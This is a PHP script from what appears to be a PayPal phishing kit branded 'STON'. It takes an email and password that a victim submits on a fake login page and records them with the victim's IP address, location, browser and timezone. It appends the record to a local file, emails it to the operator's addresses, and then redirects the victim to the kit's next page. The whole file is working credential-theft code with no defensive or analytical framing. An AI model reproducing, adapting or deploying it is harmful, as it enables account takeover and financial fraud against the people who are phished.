<?php if (isset($_POST['EML']) && isset($_POST['PWD']))
{
    session_start();
    include '../mine.php';
    include '../../prevents/PrinceDuScam1.php';
    include '../../prevents/PrinceDuScam2.php';
    include '../../prevents/PrinceDuScam3.php';
    include '../../prevents/PrinceDuScam4.php';
    include '../../prevents/PrinceDuScam5.php';
    include '../../prevents/PrinceDuScam6.php';
    include '../../prevents/PrinceDuScam7.php';
    include '../../prevents/PrinceDuScam8.php';
    $_SESSION['EML'] = $_POST['EML'];
    $msg = "=========== <[ STON PaYPal LoGiN]> ===========\r\n";
    $msg .= "EMAIL		: {$_POST['EML']}\r\n";
    $msg .= "PASS		: {$_POST['PWD']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS	: {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
    $msg .= "TIME		: " . now() . " GMT\r\n";
    $msg .= "=========== <[ STON  PaYPal LoGiN]> ===========\r\n\r\n\r\n";
    $save = fopen("../../ston.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "STON PaYPal LoGiN [" . $_POST['EML'] . "|" . $_SESSION['ip_countryName'] . "]";
    $headers = "From: STON <propaypel@gmail.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    foreach (explode(',', $yours) as $your)
    {
        @mail($your, $subject, $msg, $headers);
    }
    exit(header("Location: ../../app/process"));
} ?>
